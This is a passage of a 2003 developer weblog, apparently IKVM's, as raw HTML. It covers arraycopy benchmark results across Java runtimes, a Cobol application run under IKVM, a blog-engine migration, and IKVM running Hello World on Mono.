style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;</SPAN>throw</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <FONT 
color=#0000ff>new</FONT> 
ArrayIndexOutOfBoundsException();<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(ArgumentException) {<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayIndexOutOfBoundsException();<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>}<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<o:p></O:P></SPAN></P>
<P>No more calls to <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">GetType</SPAN> and no more 
casts to <SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array</SPAN> 
are required. In addition, since we know that the arrays are both of the same 
primitive type, we can use the more efficient <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Buffer.BlockCopy</SPAN> 
instead of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN>.</P>
<P>Here are the performance results for the new implementation:</P>
<P>
<TABLE class=MsoNormalTable 
style="WIDTH: 216.2pt; BORDER-COLLAPSE: collapse; mso-padding-alt: 0in 5.4pt 0in 5.4pt" 
cellSpacing=0 cellPadding=0 width=288 border=0>
  
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 0; mso-yfti-firstrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt"><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial"><o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">Symantec<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">JRE 
      1.4.1<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">IKVM<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 1">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">10<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1012<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">2343<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1713<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 2">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">100<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">340<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">531<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">381<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 3; mso-yfti-lastrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1000<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">120<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">310<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">230<o:p></O:P></SPAN></P></TD></TR></TABLE></P>
<P>Obviously a worthwhile improvement. For completeness, 
here are the performance results for doing the arraycopy with a simple for loop 
(i.e. in a modified version of the benchmark that doesn't call <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN>         
    , but instead has simple simple method that copies the 
array using a for loop):</P>
<P><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">for</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">(; len &gt; 0; 
len--)<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; 
</SPAN>src[srcStart++] =    dest[destStart++];<o:p></O:P></SPAN></P>
<P>
<TABLE class=MsoNormalTable 
style="WIDTH: 216.2pt; BORDER-COLLAPSE: collapse; mso-padding-alt: 0in 5.4pt 0in 5.4pt" 
cellSpacing=0 cellPadding=0 width=288 border=0>
  
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 0; mso-yfti-firstrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt"><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial"><o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">Symantec<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">JRE 
      1.4.1<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">IKVM<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 1">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">10<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1853<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">2724<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1522<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 2">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">100<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1542<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">2444<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1162<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 3; mso-yfti-lastrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1000<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1532<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">2363<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1131<o:p></O:P></SPAN></P></TD></TR></TABLE></P>
<P><o:p></O:P></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/19/2003 18:00:14 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6d43cef3-f478-4af7-bd8d-e73d30884d61"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6d43cef3-f478-4af7-bd8d-e73d30884d61">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 17 March 2003</h2></div>
<div class="newsItems"><a name="a8bc0dc84-a1ec-4109-b178-f51aa862ea0f"></a><div class="entry">
	<h3 class="entryTitle">Cobol</h3>
	<div class="entryBody">
		<P>On the ikvm-developers <A 
href="http://lists.sourceforge.net/lists/listinfo/ikvm-developers">list</A>, 
Brian Sullivan <A 
href="http://sourceforge.net/mailarchive/forum.php?thread_id=1833478&amp;forum_id=13102">reported 
</A>that he had partial success&nbsp;with running a Cobol application (compiled 
with <A href="http://www.legacyj.com/">PERCobol </A>to a Java jar) under 
ikvm.</P>
<P>The exception was caused by&nbsp;some missing org.xml.sax.* classes.</P>
<P>In unrelated news, I checked in several changes and made new <A 
href="http://www.frijters.net/ikvm.zip">source </A>and <A 
href="http://www.frijters.net/ikvmbin.zip">binaries 
</A>snapshots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/17/2003 15:20:43 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8bc0dc84-a1ec-4109-b178-f51aa862ea0f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8bc0dc84-a1ec-4109-b178-f51aa862ea0f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 13 March 2003</h2></div>
<div class="newsItems"><a name="a357454c4-e71c-40e3-9c68-773a0d7ab474"></a><div class="entry">
	<h3 class="entryTitle">Welcome on the other side</h3>
	<div class="entryBody">
		<P>Like many before me, I finally grew tired of Radio and 
so I've migrated to <A href="http://www.simplegeek.com/">BlogX</A>&nbsp;by Chris 
Anderson. All I need now is an rss aggregator, preferably ASP.NET 
based.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/13/2003 14:28:06 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=357454c4-e71c-40e3-9c68-773a0d7ab474"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=357454c4-e71c-40e3-9c68-773a0d7ab474">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 03 March 2003</h2></div>
<div class="newsItems"><a name="a89"></a><div class="entry">
	<h3 class="entryTitle">Hello Mono (2)</h3>
	<div class="entryBody">
		<PRE><FONT size=1>C:&#92;&gt;mono --noinline --share-code c:&#92;ikvm&#92;bin&#92;ikvm.exe hello<BR>** Warning **: cannot find C:&#92;cygwin&#92;home&#92;lalo&#92;go-mono&#92;install&#92;<BR></FONT><FONT size=1>etc&#92;mono&#92;machine.config<BR>Trying to load app config file...<BR>Hello World</FONT></PRE>
<P>The latest ikvm binaries together with <A href="http://go-mono.com/download.html">Mono 0.21</A>&nbsp;now run Hello World!</P>
<P>Many thanks to everyone at Ximian, the Mono contributors and&nbsp;especially Zoltan Varga!</P>
<P>The --noinline and --share-code options are needed to work around a bug in the current Mono JIT that cause it to call the class constructors to eagerly.</P>
<P>I've updated the <A href="http://www.frijters.net/ikvm.zip">source</A> and <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> snapshots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/03/2003 11:57:22 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=89"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=89">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 28 February 2003</h2></div>
<div class="newsItems"><a name="a88"></a><div class="entry">
	<h3 class="entryTitle">Undefined behavio[u]r</h3>
	<div class="entryBody">
		<P>While fixing bugs in ikvm to get more Mauve tests working (BTW, current results: 224 of 7584 tests failed), I ran across a small but interesting difference between Java and C# (and the underlying bytecodes) in converting floating point numbers to integers.</P>
<P>Java code:</P><FONT face=Courier color=#0000ff size=2>
